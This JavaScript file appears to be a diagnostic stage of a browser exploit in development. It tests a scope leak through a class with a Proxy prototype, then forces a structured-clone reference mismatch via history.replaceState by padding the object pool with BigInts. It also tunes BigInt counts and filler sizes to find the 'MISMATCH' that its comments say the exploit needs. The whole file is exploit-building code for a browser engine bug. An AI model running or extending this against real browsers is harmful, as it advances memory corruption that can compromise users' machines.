// Structured Clone diagnostic — lightweight, no heavy allocations
// Tests whether the exploit's graph shape produces a usable mismatch
// vs just "Unable to deserialize data." errors.
(function() {
'use strict';

var results = { stages: [], errors: [] };

function log(msg) {
  results.stages.push(msg);
}

// Stage 1: Scope leak test
try {
  var L = class { leak() { return super.foo; } };
  L.prototype.__proto__ = new Proxy({}, {
    get: function(t, p, r) { return r; }
  });
  var lk = L.prototype.leak;
  var scope = (function() { return lk(); })();
  var scopeOK = scope !== undefined && scope !== null && scope !== window;
  log('scope: ' + (scopeOK ? 'OK type=' + typeof scope : 'FAIL (got ' + scope + ')'));
  results.scopeOK = scopeOK;
} catch(e) {
  log('scope: ERROR ' + e.message);
  results.scopeOK = false;
}

// Stage 2: Clone mismatch with exploit graph (0x10000 outer array)
// Test each BigInt count [1,2,4,6,7] to see which produce mismatch vs error
var cloneResults = [];
var bigintCounts = [1, 2, 3, 4, 5, 6, 7, 8];

for (var ci = 0; ci < bigintCounts.length; ci++) {
  var bc = bigintCounts[ci];
  try {
    var ref = { marker: 0x51515151 };
    var filler = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    for (var j = 0; j < bc; j++) filler[pos++] = huge + BigInt(j);
    while (pos < filler.length) filler[pos++] = {};

    var outer = new Array(0x10000);
    outer[0] = filler;
    outer[1] = ref;
    outer[2] = ref;
    outer[0xffff] = -64000;

    history.replaceState(outer, '');
    var clone = history.state;

    if (!clone) {
      cloneResults.push({ bc: bc, result: 'null_state' });
    } else if (clone[1] === clone[2]) {
      cloneResults.push({ bc: bc, result: 'same_ref', len: clone.length });
    } else {
      // MISMATCH — this is what the exploit needs
      var t2 = typeof clone[2];
      var info = { bc: bc, result: 'MISMATCH', t1: typeof clone[1], t2: t2, len: clone.length };
      if (clone[2] && t2 === 'object') {
        try { info.ctor = clone[2].constructor.name; } catch(e) {}
        try { info.byteLen = clone[2].byteLength; } catch(e) {}
        try { info.arrLen = clone[2].length; } catch(e) {}
      }
      cloneResults.push(info);
    }
    history.replaceState(null, '');
  } catch(e) {
    cloneResults.push({ bc: bc, result: 'error', msg: e.message.substring(0, 80) });
    try { history.replaceState(null, ''); } catch(e2) {}
  }
  // Small filler cleanup
  filler = null; outer = null; clone = null;
}

results.cloneResults = cloneResults;

// Stage 3: Test with smaller filler arrays to find working pool size
var sizeResults = [];
var fillerSizes = [0xff, 0xfff, 0x3fff, 0x7fff, 0xfffd];

for (var si = 0; si < fillerSizes.length; si++) {
  var sz = fillerSizes[si];
  try {
    var ref2 = { marker: 0x42424242 };
    var filler2 = new Array(sz);
    var pos2 = 0;
    for (var k = 0; k < 2; k++) filler2[pos2++] = (1n << 40n) + BigInt(k);
    while (pos2 < filler2.length) filler2[pos2++] = {};

    var outerSize = sz + 3;
    var outer2 = new Array(outerSize);
    outer2[0] = filler2;
    outer2[1] = ref2;
    outer2[2] = ref2;
    outer2[outerSize - 1] = -64000;

    history.replaceState(outer2, '');
    var clone2 = history.state;

    if (!clone2) {
      sizeResults.push({ sz: sz, result: 'null' });
    } else if (clone2[1] === clone2[2]) {
      sizeResults.push({ sz: sz, result: 'same' });
    } else {
      sizeResults.push({ sz: sz, result: 'MISMATCH', t2: typeof clone2[2] });
    }
    history.replaceState(null, '');
  } catch(e) {
    sizeResults.push({ sz: sz, result: 'error', msg: e.message.substring(0, 60) });
    try { history.replaceState(null, ''); } catch(e2) {}
  }
  filler2 = null; outer2 = null; clone2 = null;
}

results.sizeResults = sizeResults;

// Stage 4: Test if the filler count absorbs the BigInt shift
// The shift = BigInt count. Pool indices [0..N] where N = total serialized objects.
// If duplicate ref index + shift > pool size, we get deserialization error.
// We need: (pool_size) > (duplicate_ref_pool_index) + (bigint_count)
var shiftResults = [];
for (var bi = 1; bi <= 8; bi++) {
  // Use a large filler to ensure pool has enough entries
  try {
    var ref3 = { marker: 0xAAAAAAAA };
    var pool = [];
    // Add many objects to the pool before the duplicate ref
    for (var pi = 0; pi < 100; pi++) pool.push({ filler: pi });
    pool.push(ref3);  // this gets pool index = (pool objects so far)
    pool.push(ref3);  // duplicate ref — should deserialize to same object

    // Add BigInts that will shift the pool
    for (var bj = 0; bj < bi; bj++) pool.push(BigInt(bj + 1));

    history.replaceState(pool, '');
    var clone3 = history.state;

    if (!clone3) {
      shiftResults.push({ bi: bi, result: 'null' });
    } else {
      var refIdx = 100;
      var dupIdx = 101;
      var match = clone3[refIdx] === clone3[dupIdx];
      var info3 = { bi: bi, match: match };
      if (!match) {
        info3.result = 'MISMATCH';
        info3.t_ref = typeof clone3[refIdx];
        info3.t_dup = typeof clone3[dupIdx];
        if (clone3[dupIdx] && typeof clone3[dupIdx] === 'object') {
          try { info3.ctor = clone3[dupIdx].constructor.name; } catch(e) {}
        }
      } else {
        info3.result = 'same';
      }
      shiftResults.push(info3);
    }
    history.replaceState(null, '');
  } catch(e) {
    shiftResults.push({ bi: bi, result: 'error', msg: e.message.substring(0, 60) });
    try { history.replaceState(null, ''); } catch(e2) {}
  }
}

results.shiftResults = shiftResults;

return JSON.stringify(results);
})();
